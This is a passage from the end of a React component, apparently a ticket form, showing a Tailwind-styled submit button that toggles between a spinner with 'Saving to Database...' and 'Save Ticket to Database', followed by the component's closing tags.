                    className="w-full bg-[#00a699] hover:bg-[#008e82] text-white font-bold text-xs py-3 rounded-lg shadow transition-all cursor-pointer flex items-center justify-center gap-2"
                  >
                    {isSubmittingComp ? (
                      <>
                        <RefreshCw className="w-4 h-4 animate-spin" /> Saving to Database...
                      </>
                    ) : (
                      <>
                        <Send className="w-4 h-4" /> Save Ticket to Database
                      </>
                    )}
                  </button>
                </form>
              )}
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
